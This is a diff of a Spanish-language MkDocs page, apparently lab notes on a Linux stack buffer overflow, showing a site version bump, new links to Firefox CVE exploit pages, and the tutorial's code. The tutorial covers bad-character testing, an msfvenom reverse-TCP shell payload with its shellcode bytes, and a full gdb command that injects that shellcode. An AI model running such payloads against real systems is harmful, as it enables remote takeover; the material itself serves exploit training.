@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
@@ -27,7 +27,7 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
         <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
@@ -307,6 +307,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -423,6 +427,62 @@
     
   
     CVE-2026-42980 WMI Underflow (ES)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/binary-gecko-academy/cve-2019-11707-firefox-ionmonkey-to-system-en/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2019-11707 Firefox to SYSTEM (EN)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/binary-gecko-academy/cve-2019-11707-firefox-ionmonkey-to-system-es/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2019-11707 Firefox a SYSTEM (ES)
   
 
     
@@ -1620,7 +1680,7 @@
 </span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>
 </span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">    </span><span class="n">bowfunc</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Done.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"Done.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 </span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 </span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="p">}</span>
 </span></code></pre></div>
@@ -1642,11 +1702,11 @@
 <h4 id="compilar-a-32-bits">Compilar a 32 bits<a class="headerlink" href="#compilar-a-32-bits" title="Permanent link">&para;</a></h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>student@nix-bow:~$<span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>gcc-multilib
 </span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>student@nix-bow:~$<span class="w"> </span>gcc<span class="w"> </span>bow.c<span class="w"> </span>-o<span class="w"> </span>bow32<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-z<span class="w"> </span>execstack<span class="w"> </span>-m32
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>student@nix-bow:~$<span class="w"> </span>file<span class="w"> </span>bow32<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s2">&quot;,&quot;</span><span class="w"> </span><span class="s2">&quot;\n&quot;</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>student@nix-bow:~$<span class="w"> </span>file<span class="w"> </span>bow32<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s2">","</span><span class="w"> </span><span class="s2">"\n"</span>
 </span></code></pre></div>
 <h4 id="compilar-a-64-bits">Compilar a 64 bits<a class="headerlink" href="#compilar-a-64-bits" title="Permanent link">&para;</a></h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>student@nix-bow:~$<span class="w"> </span>gcc<span class="w"> </span>bow.c<span class="w"> </span>-o<span class="w"> </span>bow64<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-z<span class="w"> </span>execstack<span class="w"> </span>-m64
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>student@nix-bow:~$<span class="w"> </span>file<span class="w"> </span>bow64<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s2">&quot;,&quot;</span><span class="w"> </span><span class="s2">&quot;\n&quot;</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>student@nix-bow:~$<span class="w"> </span>file<span class="w"> </span>bow64<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s2">","</span><span class="w"> </span><span class="s2">"\n"</span>
 </span></code></pre></div>
 <h2 id="funciones-de-c-a-tener-en-cuenta-que-pueden-ser-vulnerables">Funciones de C a tener en cuenta que pueden ser vulnerables<a class="headerlink" href="#funciones-de-c-a-tener-en-cuenta-que-pueden-ser-vulnerables" title="Permanent link">&para;</a></h2>
 <ul>
@@ -1704,7 +1764,7 @@
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>The<span class="w"> </span>program<span class="w"> </span>being<span class="w"> </span>debugged<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>started<span class="w"> </span>already.
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Start<span class="w"> </span>it<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>beginning?<span class="w"> </span><span class="o">(</span>y<span class="w"> </span>or<span class="w"> </span>n<span class="o">)</span><span class="w"> </span>y
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>Starting<span class="w"> </span>program:<span class="w"> </span>/home/student/bow/bow32<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;\x55&#39; * 1036 + &#39;\x66&#39; * 4&quot;</span><span class="k">)</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>Starting<span class="w"> </span>program:<span class="w"> </span>/home/student/bow/bow32<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">"print '\x55' * 1036 + '\x66' * 4"</span><span class="k">)</span>
 </span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
 </span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>0x66666666<span class="w"> </span><span class="k">in</span><span class="w"> </span>??<span class="w"> </span><span class="o">()</span>
 </span></code></pre></div>
@@ -1725,7 +1785,7 @@ La idea es llenar todo el buffer hasta alcanzar la dirección de retorno (EIP/RI
 - Una zona de NOPs.
 - El shellcode.
 - Un sobrescrito final (por ejemplo, 4 bytes específicos para identificar el EIP).</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print &quot;\x55&quot; * (1040 - 100 - 150 - 4) + &quot;\x90&quot; * 100 + &quot;\x44&quot; * 150 + &quot;\x66&quot; * 4&#39;</span><span class="k">)</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4'</span><span class="k">)</span>
 </span></code></pre></div>
 <h2 id="imagenes-de-apoyo">Imágenes de Apoyo<a class="headerlink" href="#imagenes-de-apoyo" title="Permanent link">&para;</a></h2>
 <p><img alt="Imagen 1" src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_8.png" />
@@ -1736,14 +1796,14 @@ La idea es llenar todo el buffer hasta alcanzar la dirección de retorno (EIP/RI
 <p>Los <em>bad characters</em> son bytes que, por la forma en que la aplicación procesa la entrada (por ejemplo, terminación de cadenas, sanitización, etc.), se corrompen o modifican durante el envío. Esto impide que el payload se copie de forma íntegra a la memoria.</p>
 <h2 id="generacion-de-la-lista-completa">Generación de la Lista Completa<a class="headerlink" href="#generacion-de-la-lista-completa" title="Permanent link">&para;</a></h2>
 <p>Se define una variable con todos los bytes del <code>0x00</code> al <code>0xff</code>:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nv">CHARS</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\\x%02x&#39;</span><span class="w"> </span><span class="o">{</span><span class="m">0</span>..255<span class="o">}</span><span class="k">)</span><span class="s2">&quot;</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nv">CHARS</span><span class="o">=</span><span class="s2">"</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">'\\x%02x'</span><span class="w"> </span><span class="o">{</span><span class="m">0</span>..255<span class="o">}</span><span class="k">)</span><span class="s2">"</span>
 </span></code></pre></div>
 <p>Para contar el número de bytes:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$CHARS</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">&#39;s/\\x/ /g&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>wc<span class="w"> </span>-w
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$CHARS</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">'s/\\x/ /g'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>wc<span class="w"> </span>-w
 </span></code></pre></div>
 <h2 id="prueba-de-envio-y-deteccion">Prueba de Envío y Detección<a class="headerlink" href="#prueba-de-envio-y-deteccion" title="Permanent link">&para;</a></h2>
 <p>Se envía el payload al programa vulnerable, incluyendo el bloque de caracteres:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print &quot;\x55&quot; * (1040 - 256 - 4) + &quot;&lt;CHARS&gt;&quot; + &quot;\x66&quot; * 4&#39;</span><span class="k">)</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">'print "\x55" * (1040 - 256 - 4) + "&lt;CHARS&gt;" + "\x66" * 4'</span><span class="k">)</span>
 </span></code></pre></div>
 <p><em>Reemplazar <code>&lt;CHARS&gt;</code> por la secuencia completa.</em></p>
 <p>Luego, inspeccionamos la memoria para verificar el estado de la secuencia:</p>
@@ -1753,7 +1813,7 @@ La idea es llenar todo el buffer hasta alcanzar la dirección de retorno (EIP/RI
 <ul>
 <li>con msfvenom: <code>GNT@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=&lt;LHOST&gt; lport=&lt;LPORT&gt; --format c --arch x86 --platform linux --bad-chars "&lt;chars&gt;" --out &lt;filename&gt;</code></li>
 </ul>
-<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>GNT@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/shell_reverse_tcp<span class="w"> </span><span class="nv">lhost</span><span class="o">=</span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="nv">lport</span><span class="o">=</span><span class="m">31337</span><span class="w"> </span>--format<span class="w"> </span>c<span class="w"> </span>--arch<span class="w"> </span>x86<span class="w"> </span>--platform<span class="w"> </span>linux<span class="w"> </span>--bad-chars<span class="w"> </span><span class="s2">&quot;\x00\x09\x0a\x20&quot;</span><span class="w"> </span>--out<span class="w"> </span>shellcode
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>GNT@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/shell_reverse_tcp<span class="w"> </span><span class="nv">lhost</span><span class="o">=</span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="nv">lport</span><span class="o">=</span><span class="m">31337</span><span class="w"> </span>--format<span class="w"> </span>c<span class="w"> </span>--arch<span class="w"> </span>x86<span class="w"> </span>--platform<span class="w"> </span>linux<span class="w"> </span>--bad-chars<span class="w"> </span><span class="s2">"\x00\x09\x0a\x20"</span><span class="w"> </span>--out<span class="w"> </span>shellcode
 </span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
 </span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>Found<span class="w"> </span><span class="m">11</span><span class="w"> </span>compatible<span class="w"> </span>encoders
 </span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>Attempting<span class="w"> </span>to<span class="w"> </span>encode<span class="w"> </span>payload<span class="w"> </span>with<span class="w"> </span><span class="m">1</span><span class="w"> </span>iterations<span class="w"> </span>of<span class="w"> </span>x86/shikata_ga_nai
@@ -1767,9 +1827,9 @@ La idea es llenar todo el buffer hasta alcanzar la dirección de retorno (EIP/RI
 </span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>GNT@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>cat<span class="w"> </span>shellcode
 </span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>
 </span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>unsigned<span class="w"> </span>char<span class="w"> </span>buf<span class="o">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
-</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="s2">&quot;\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1&quot;</span>
-</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="s2">&quot;\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41&quot;</span>
-</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="s2">&quot;\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b&quot;</span>
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="s2">"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"</span>
+</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="s2">"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"</span>
+</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="s2">"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"</span>
 </span></code></pre></div>
 - Explotando... : <code>gdb --args ./bow $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xbe\x97\x4c\xf2\x9c\xd9\xf7\xd9\x74\x24\xf4\x5f\x33\xc9\xb1\x12\x83\xc7\x04\x31\x77\x0e\x03\xe0\x42\x10\x69\x3f\x80\x23\x71\x6c\x75\x9f\x1c\x90\xf0\xfe\x51\xf2\xcf\x81\x01\xa3\x7f\xbe\xe8\xd3\xc9\xb8\x0b\xbb\xb6\x3a\xec\x3a\x21\x39\xec\x46\xd8\xb4\x0d\x06\x7c\x97\x9c\x35\x32\x14\x96\x58\xf9\x9b\xfa\xf2\x6c\xb3\x89\x6a\x19\xe4\x42\x08\xb0\x73\x7f\x9e\x11\x0d\x61\xae\x9d\xc0\xe2" + "\x66" * 4')</code>
 - Llenamos el buffer con el caracter <code>\x55</code>, U en ascii.
@@ -1858,7 +1918,7 @@ La idea es llenar todo el buffer hasta alcanzar la dirección de retorno (EIP/RI
       <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.sections", "navigation.top", "navigation.tracking", "navigation.indexes", "toc.integrate", "content.code.copy", "content.action.edit", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
     
   </body>
